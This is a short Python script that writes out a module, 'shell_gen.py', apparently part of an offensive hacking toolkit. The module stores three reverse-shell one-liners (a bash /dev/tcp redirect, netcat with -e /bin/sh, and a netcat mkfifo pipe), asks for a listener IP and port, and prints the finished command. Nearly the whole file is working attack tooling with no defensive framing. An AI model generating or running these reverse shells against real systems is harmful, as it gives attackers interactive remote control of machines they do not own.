content = """from rich.console import Console
from rich.prompt import Prompt

console = Console()

SHELLS = {
    "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "nc": "nc -e /bin/sh {ip} {port}",
    "nc-mkfifo": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} > /tmp/f",
}


def run():
    ip = Prompt.ask("listener IP")
    port = Prompt.ask("listener port")
    console.print("\\n[cyan]available shells:[/cyan]")
    for name in SHELLS:
        console.print(f"  [yellow]{name}[/yellow]")
    choice = Prompt.ask("\\nwhich shell", default="bash")
    if choice not in SHELLS:
        console.print("[red]unknown shell[/red]")
        return
    cmd = SHELLS[choice].format(ip=ip, port=port)
    console.print(f"\\n[green]{cmd}[/green]")
"""

f = open("modules/shell_gen.py", "w", encoding="utf-8")
f.write(content)
f.close()

print("done")
